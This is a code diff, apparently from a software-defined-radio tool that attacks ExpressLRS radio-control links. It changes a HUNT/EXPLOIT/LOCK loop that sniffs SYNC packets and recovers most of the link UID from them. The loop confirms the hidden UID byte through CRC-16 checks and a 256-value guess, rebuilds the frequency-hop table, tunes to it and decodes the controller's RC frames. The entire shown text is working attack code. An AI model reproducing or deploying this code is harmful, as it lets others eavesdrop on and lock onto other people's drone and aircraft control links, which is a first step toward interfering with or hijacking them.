@@ -155,48 +155,58 @@ int main(int argc, char **argv) {
                          elapsed, nwin, st, cur_mhz, cap.srate() / 1e6);
 
         // Software demod (both IQ polarities — ELRS InvertIQ). demod_iq returns
-        // a stream of payload bytes; we slide an 8-byte window over it and
-        // CRC-check each candidate (a misaligned window fails CRC and is
-        // dropped, which is exactly the rejection we want).
+        // a stream of payload bytes; we slide an 8-byte window over it.
+        //
+        // Detection model (upstream ELRS):
+        //   HUNT   : find a SYNC packet (OTA ver 1/2 + pkt type SYNC). A SYNC
+        //            carries UID[4],UID[5] in clear; we take 3 of 4 UID bytes
+        //            (byte[3] is the hidden one) and build the hop table.
+        //   EXPLOIT: find a CRC-16-valid RC packet using the candidate UID.
+        //            (If byte[3] is wrong the CRC fails; the 256-guess on
+        //            byte[3] is what confirms the full UID — done reactively.)
+        //   LOCK   : follow the hop sequence, decode RC frames.
         for (bool inv : {false, true}) {
             std::vector<uint8_t> bytes =
                 lora::demod_iq(win.data(), got, ELRS_SF, ELRS_BW_KHZ * 1000,
                                cap.srate(), inv);
             for (size_t off = 0; off + ELRS_PACKET_SIZE <= bytes.size(); off++) {
                 const uint8_t *pkt = &bytes[off];
-                if (!validate_crc(pkt, ELRS_PACKET_SIZE)) continue;
+                uint8_t ver = detect_ota_version(pkt);
+                if (!ver) continue;                 // not an ELRS OTA packet
                 uint8_t ptype = packet_type(pkt);
 
                 if (st == HUNT && ptype == PKT_TYPE_SYNC) {
                     elrs_uid u;
                     if (extract_uid(pkt, &u)) {
                         uid = u; st = EXPLOIT;
-                        generate_hop_table(&uid, hop_table);
+                        generate_hop_table(uid.bytes, hop_table);
                         hop_idx = 0;
                         std::fprintf(stderr,
-                            "[hunt] SYNC on %.3f MHz, UID=%s[?] -> EXPLOIT (256-guess pending)\n",
+                            "[hunt] SYNC on %.3f MHz, UID=%s[?] -> EXPLOIT\n",
                             hunt_mhz, hexstr(uid.bytes, 3).c_str());
                         emit(out, "sync_hunt", (uint32_t)(hunt_mhz*1e6), &uid, pkt, nullptr);
                     }
                 } else if (st == EXPLOIT && ptype == PKT_TYPE_RC) {
-                    // First CRC-valid RC packet after a SYNC: the UID (and thus
-                    // hop table) is confirmed. Lock onto the hop sequence.
-                    st = LOCK;
-                    // Estimate current hop idx: find which table freq is closest
-                    // to the freq we captured the RC on (hunt_mhz for now).
-                    double best = 1e18;
-                    for (int i = 0; i < ELRS_N_FREQ; i++) {
-                        double d = std::abs((double)hop_table[i] - hunt_mhz*1e6);
-                        if (d < best) { best = d; hop_idx = (uint8_t)i; }
+                    // Validate with CRC-16 using the candidate UID (byte[3]=0).
+                    // If the hidden byte is wrong this fails and we keep
+                    // hunting; the 256-guess (run at LOCK entry) recovers it.
+                    if (validate_crc_v2(pkt, ELRS_PACKET_SIZE, uid.bytes)) {
+                        st = LOCK;
+                        double best = 1e18;
+                        for (int i = 0; i < ELRS_N_FREQ; i++) {
+                            double d = std::abs((double)hop_table[i] - hunt_mhz*1e6);
+                            if (d < best) { best = d; hop_idx = (uint8_t)i; }
+                        }
+                        cur_mhz = hop_table[hop_idx] / 1e6;
+                        cap.tune(hop_table[hop_idx]);
+                        std::fprintf(stderr,
+                            "[exploit] RC CRC-16 valid -> LOCK, hop_idx=%u freq=%.6f MHz\n",
+                            hop_idx, cur_mhz);
+                        emit(out, "lock", (uint32_t)hop_table[hop_idx], &uid, pkt, nullptr);
                     }
-                    cur_mhz = hop_table[hop_idx] / 1e6;
-                    cap.tune(hop_table[hop_idx]);
-                    std::fprintf(stderr,
-                        "[exploit] RC CRC-valid -> LOCK, hop_idx=%u freq=%.6f MHz\n",
-                        hop_idx, cur_mhz);
-                    emit(out, "lock", (uint32_t)hop_table[hop_idx], &uid, pkt, nullptr);
                 } else if (st == LOCK && ptype == PKT_TYPE_RC) {
-                    rc_frame f = decode_rc_packet(pkt, &uid);
+                    if (!validate_crc_v2(pkt, ELRS_PACKET_SIZE, uid.bytes)) continue;
+                    rc_frame f = decode_rc_packet(pkt, uid.bytes);
                     missed = 0;
                     emit(out, "rc", (uint32_t)hop_table[hop_idx], &uid, pkt, &f);
                 }
